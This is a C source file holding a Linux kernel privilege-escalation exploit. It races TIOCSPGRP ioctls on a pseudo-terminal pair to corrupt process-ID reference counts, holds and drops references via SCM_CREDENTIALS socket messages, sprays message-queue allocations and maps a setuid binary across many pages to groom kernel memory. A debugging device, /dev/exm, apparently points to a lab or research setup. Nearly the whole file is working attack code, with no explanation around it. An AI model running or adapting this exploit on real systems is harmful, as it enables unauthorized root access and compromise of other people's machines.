#define _GNU_SOURCE
#include <signal.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <sched.h>
#include <semaphore.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

// #define fork() syscall(__NR_clone, CLONE_FILES | SIGCHLD, NULL, NULL, NULL, 0)

#include "module.h"

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define SOCKS_FOR_CREDS 100
#define CREDS_PER_SOCKET 100
#define SKEW_ATTEMPTS 50000

struct pty_pair {
    int ptmx;
    int tty;
};

struct expmsg_t {
  long type;
  char text[0];
};

struct sockaddr_un unix_addr = {
    .sun_family = AF_UNIX,
    .sun_path = "/tmp/exploitsocket"
};
int listensock;
int cred_socks[SOCKS_FOR_CREDS][2];
volatile int* syncptr;
int queue;

int exm = -1;

struct {
    pid_t pid;
    unsigned long pid_addr;
} exm_data;

void exm_chk_refcnt() {
    int refcnt = ioctl(exm, IOC_PID_REFCNT, exm_data.pid_addr);
    printf("[PID] %d refcount = %x\n", exm_data.pid, refcnt);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    int r = SYSCHK(sched_setaffinity(0, sizeof(cpuset), &cpuset));
}

void inc_pid(pid_t pid)
{
    uid_t uid = getuid();
    uid_t gid = getgid();
    for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
        for (int refs_held = 0; refs_held < CREDS_PER_SOCKET; refs_held++) {
            struct iovec iov = { .iov_base = "a", .iov_len = 1 };
            struct __attribute__((aligned(8))) {
                struct cmsghdr hdr;
                struct ucred ucred;
            } controldata = {
                .hdr = {
                    .cmsg_len = sizeof(struct cmsghdr) + sizeof(struct ucred),
                    .cmsg_level = SOL_SOCKET,
                    .cmsg_type = SCM_CREDENTIALS },
                .ucred = { .pid = pid, .uid = uid, .gid = gid }
            };
            struct msghdr hdr = {
                .msg_iov = &iov,
                .msg_iovlen = 1,
                .msg_control = &controldata,
                .msg_controllen = sizeof(controldata)
            };
            if (sockidx == 0) {

            }
            int ret = sendmsg(cred_socks[sockidx][0], &hdr, MSG_DONTWAIT);
            if (ret <= 0) {
                err(1, "sendmsg failed, CREDS_PER_SOCKET is probably too high");
                break;
            }
        }
    }
}

void dec_pid(pid_t pid)
{
    int df_status;
    puts("dec_pid");
    *syncptr = 0;
    pid_t df_child = fork();
    if (df_child == -1)
        err(1, "fork");
    if (df_child == 0) {
        for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
            // printf("dec %d\n", sockidx);
            exm_chk_refcnt();
            for (int refs = 0; refs < CREDS_PER_SOCKET; refs++) {
                char dummy;
                if (read(cred_socks[sockidx][1], &dummy, 1) != 1)
                    err(1, "read from sockpair_refhold failed with syscall return???");
                (*syncptr)++;
            }
        }
        errx(1, "unexpectedly all socket data was flushed out successfully?");
    }

    if (waitpid(df_child, &df_status, 0) != df_child)
        err(1, "waitpid");
    // if (!WIFSIGNALED(df_status))
    //     errx(1, "double-free child did not die due to signal?");
    printf("double-free child died with signal %d after dropping %d references (%d%%)\n",
        WTERMSIG(df_status), *syncptr,
        100 * (*syncptr) / (SOCKS_FOR_CREDS * CREDS_PER_SOCKET));
    puts("exit dec_pid");
}

pid_t trigger_bug(struct pty_pair pair)
{
    puts("start trigger bug");
    pid_t parent = getpid();
    pid_t child = fork();
    if (child == 0) {
        pid_t pid = getpid();
        printf("fork bug child\n");
        pin_cpu(1);

        /* create post-death-incrementable pid reference */
        SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));

        SYSCHK(setpgid(0, 0));

        printf("start inc\n");
        inc_pid(pid);
        printf("finish inc\n");

        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
            while (1) {
                char syncval = *syncptr;
                if ((syncval & 1) == 0) {
                    if (syncval == 10)
                        break;
                    *syncptr = syncval + 1;
                }
            }
            /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
            SYSCHK(ioctl(pair.tty, TIOCSPGRP, &parent));
            *syncptr = 11;
        }
        printf("bug child exit\n");
        exit(0);
    }

    exm_data.pid = child;
    exm_data.pid_addr = ioctl(exm, IOC_PID_ADDR, child);

    for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
        /* update parent -> child (does not race) */
        SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &child));

        *syncptr = 0;
        while (1) {
            char syncval = *syncptr;
            if ((syncval & 1) == 1) {
                *syncptr = syncval + 1;
                /* at 9, we first bump to 10 so that the child can go ahead, then also go ahead ourselves */
                if (syncval == 9)
                    break;
            }
        }

        /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
        SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &parent));

        while (*syncptr != 11) /*wait*/
            ;
    }

    exm_chk_refcnt();

    int status;
    if (waitpid(child, &status, 0) != child) {
        err(1, "wait for bug child");
    }

    puts("end trigger bug");
    return child;
}


struct pty_pair setup_tty() {
    struct pty_pair pair;
    pid_t main_task = SYSCHK(fork());
    if (main_task != 0) {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        exit(0);
    }
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1)
        exit(0);

    printf("executing in first level child process, setting up session and PTY pair...\n");

    /* basic preparation */
    SYSCHK(signal(SIGTTOU, SIG_IGN));
    SYSCHK(setsid());

    /* set up a new pty pair */
    pair.ptmx = SYSCHK(open("/dev/ptmx", O_RDWR));
    unlockpt(pair.ptmx);
    pair.tty = SYSCHK(open(ptsname(pair.ptmx), O_RDWR));
    return pair;
}

void setup_data() {
    syncptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if ((void*)syncptr == MAP_FAILED)
        err(1, "mmap shared");

    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));

    for (int i = 0; i < SOCKS_FOR_CREDS; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cred_socks[i]));
    }

    queue = SYSCHK(msgget(IPC_PRIVATE, 0600));

    exm = open("/dev/exm", O_RDWR);
    if (exm == -1) {
        perror("open /dev/exm");
    }
}

int la = 64;
int lb = 30;
int lc = 16;

void prepare_vmas(char *base) {
    char* suid_path = "/sbin/busybox";

    int suid_fd = SYSCHK(open(suid_path, O_RDONLY));
    if (mmap((void*)(base + 0x3ffff000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, suid_fd, 0) == MAP_FAILED)
        err(1, "mmap to materialize L2 table and above");
    *(volatile char*)(base + 0x3ffff000);
    for (int i = 0; i < la * lb; i++) {
        if (mmap((void*)(base + i * lc * 0x1000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, suid_fd, 0) == MAP_FAILED)
            err(1, "mmap suid binary");
    }
}

long alloc_n(long n) {
  static int total_s;
  int r;
  struct expmsg_t msg = {
    .type = n
  };
  r = msgsnd(queue, (void *)&msg, sizeof(msg.text), 0);
  if (++total_s % 1000 == 0)
    printf("sent %d (%lx)\n", total_s, n);
  if (r == -1) {
    err(1, "snd %lx", n);
  }
  return n;
}

void free_n(long n) {
  static int total_r;
  int r;
  struct expmsg_t msg;
  r = msgrcv(queue, (void*)&msg, sizeof(msg), n, 0);
  if (r == -1) {
    err(1, "rcv %ld", n);
  }
  if (++total_r % 20 == 0)
    printf("recv %d (%ld)\n", total_r, msg.type);
}

int seq_id = 1;

long fill_one_page() {
  long si = seq_id++;
  for (int i = 0; i < 63; i++) {
    alloc_n(si);
  }
  return alloc_n(seq_id++);
}

int exploit() {
    pid_t pid;
    setbuf(stdout, NULL);
    sync();

    printf("starting up...\n");

    pin_cpu(0);

    struct pty_pair pair = setup_tty();
    setup_data();

    char *base = (char *)0x40000000;
    prepare_vmas(base);

#define NUM_DRAIN_FDS 40
    long drain_fds[NUM_DRAIN_FDS];
    long seqfiles[1024];
    int i_seq;

    for (int i = 0; i < 50; i++) {
        fill_one_page();
    }

    for (int i = 0; i < NUM_DRAIN_FDS; i++)
        drain_fds[i] = fill_one_page();

    for (i_seq = 0; i_seq < 64; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }

    pid = trigger_bug(pair);

    for (; i_seq < 64 + 64 + 2; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }

    dec_pid(pid);
    puts("post dec");

    exm_chk_refcnt();

    for (int i = 0; i < i_seq; i++) {
        free_n(seqfiles[i]);
    }

    for (int i = 0; i < NUM_DRAIN_FDS; i++) {
        free_n(drain_fds[i]);
    }

    for (int i = 0; i < la * lb; i++) {
        *(volatile char*)(base + i * lc * 0x1000);
    }

    exm_chk_refcnt();

    return 0;
}

int main() {
    exploit();
    return 0;
}